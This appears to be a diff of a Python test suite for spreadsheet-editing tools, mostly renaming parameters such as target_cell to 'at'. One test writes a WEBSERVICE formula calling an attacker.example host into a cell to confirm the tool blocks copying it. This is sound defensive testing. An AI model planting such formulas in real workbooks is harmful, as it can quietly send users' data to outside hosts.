@@ -33,7 +33,7 @@ def _text_formula_workbook(path: Path) -> None:
 
 async def test_copied_text_stays_text(call: ToolCall, files: Path) -> None:
     _text_formula_workbook(files / "t.xlsx")
-    await call("copy_range", path="t.xlsx", sheet="Data", range="A2", target_cell="D2")
+    await call("copy_range", path="t.xlsx", sheet="Data", range="A2", at="D2")
     assert load_workbook(files / "t.xlsx")["Data"]["D2"].data_type == "s"
 
 
@@ -42,12 +42,11 @@ async def test_pivot_text_stays_text(call: ToolCall, files: Path) -> None:
     await call(
         "create_pivot_table",
         path="t.xlsx",
-        source_sheet="Data",
-        source_range="A1:B2",
-        rows=["Group"],
-        values=[{"field": "Value"}],
-        target_sheet="Data",
-        target_cell="F1",
+        source="Data!A1:B2",
+        row_fields=["Group"],
+        value_fields=[{"field": "Value"}],
+        sheet="Data",
+        at="F1",
     )
     assert load_workbook(files / "t.xlsx")["Data"]["F2"].data_type == "s"
 
@@ -56,9 +55,7 @@ async def test_copied_formulas_are_checked(call_error: ToolCall, sample: Path, f
     workbook = load_workbook(sample)
     workbook["Data"]["E2"] = '=WEBSERVICE("https://attacker.example")'
     workbook.save(sample)
-    message = await call_error(
-        "copy_range", path="sales.xlsx", sheet="Data", range="E2", target_cell="E3"
-    )
+    message = await call_error("copy_range", path="sales.xlsx", sheet="Data", range="E2", at="E3")
     assert "not allowed" in message
 
 
@@ -78,7 +75,7 @@ async def test_concurrent_edits_are_not_lost(client: Client, sample: Path) -> No
         *(
             client.call_tool(
                 "write_range",
-                {"path": "sales.xlsx", "sheet": "Report", "start_cell": f"A{row}", "rows": [[row]]},
+                {"path": "sales.xlsx", "sheet": "Report", "at": f"A{row}", "rows": [[row]]},
             )
             for row in range(1, 21)
         )
@@ -95,13 +92,13 @@ async def test_edits_keep_pictures(call: ToolCall, sample: Path) -> None:
     workbook["Report"].add_image(Image(picture), "C3")
     workbook.save(sample)
 
-    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[["x"]])
+    await call("write_range", path="sales.xlsx", sheet="Report", at="A1", rows=[["x"]])
     assert len(load_workbook(sample).worksheets[1]._images) == 1  # pyright: ignore[reportAttributeAccessIssue]
 
 
 async def test_writes_past_the_grid_are_rejected(call_error: ToolCall, sample: Path) -> None:
     message = await call_error(
-        "write_range", path="sales.xlsx", sheet="Data", start_cell="XFD1", rows=[[1, 2]]
+        "write_range", path="sales.xlsx", sheet="Data", at="XFD1", rows=[[1, 2]]
     )
     assert "worksheet limits" in message
 
@@ -111,14 +108,14 @@ async def test_inserting_past_the_grid_is_rejected(call_error: ToolCall, sample:
     workbook["Report"]["A1048576"] = "last"
     workbook.save(sample)
     message = await call_error(
-        "insert_rows_or_columns", path="sales.xlsx", sheet="Report", axis="rows", at=1
+        "insert_rows_or_columns", path="sales.xlsx", sheet="Report", axis="rows", start=1
     )
     assert "past the last" in message
 
 
 async def test_control_characters_are_rejected(call_error: ToolCall, sample: Path) -> None:
     message = await call_error(
-        "write_range", path="sales.xlsx", sheet="Data", start_cell="A1", rows=[["a\x01b"]]
+        "write_range", path="sales.xlsx", sheet="Data", at="A1", rows=[["a\x01b"]]
     )
     assert "control characters" in message
 
@@ -166,8 +163,8 @@ async def test_merged_target_cells_are_rejected(call_error: ToolCall, sample: Pa
         path="sales.xlsx",
         sheet="Data",
         range="A1:B1",
-        target_cell="A1",
-        target_sheet="Report",
+        at="A1",
+        to_sheet="Report",
     )
     assert "merged" in message
 
@@ -177,9 +174,9 @@ async def test_chart_anchor_is_normalized(call: ToolCall, sample: Path) -> None:
         "create_chart",
         path="sales.xlsx",
         sheet="Report",
-        data_range="Data!B1:C5",
+        source="Data!B1:C5",
         chart_type="column",
-        anchor_cell=" d5 ",
+        at=" d5 ",
     )
 
 
@@ -221,11 +218,11 @@ async def test_area_chart_axes_survive_later_edits(call: ToolCall, sample: Path)
         "create_chart",
         path="sales.xlsx",
         sheet="Report",
-        data_range="Data!B1:C5",
+        source="Data!B1:C5",
         chart_type="area",
-        anchor_cell="B2",
+        at="B2",
     )
-    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[["x"]])
+    await call("write_range", path="sales.xlsx", sheet="Report", at="A1", rows=[["x"]])
     with zipfile.ZipFile(sample) as archive:
         chart_xml = archive.read("xl/charts/chart1.xml").decode()
     assert chart_xml.count('<c:delete val="0"') + chart_xml.count('<delete val="0"') == 2
@@ -235,7 +232,7 @@ async def test_macro_enabled_workbooks_can_be_edited(
     call: ToolCall, sample: Path, files: Path
 ) -> None:
     (files / "macro.xlsm").write_bytes(sample.read_bytes())
-    await call("write_range", path="macro.xlsm", sheet="Report", start_cell="A1", rows=[["x"]])
+    await call("write_range", path="macro.xlsm", sheet="Report", at="A1", rows=[["x"]])
     data = await call("read_range", path="macro.xlsm", sheet="Report")
     assert data["values"] == [["x"]]
 
@@ -382,6 +379,6 @@ async def test_written_formulas_cannot_reach_other_workbooks(
     call_error: ToolCall, sample: Path, formula: str
 ) -> None:
     message = await call_error(
-        "write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[[formula]]
+        "write_range", path="sales.xlsx", sheet="Report", at="A1", rows=[[formula]]
     )
     assert "not allowed" in message
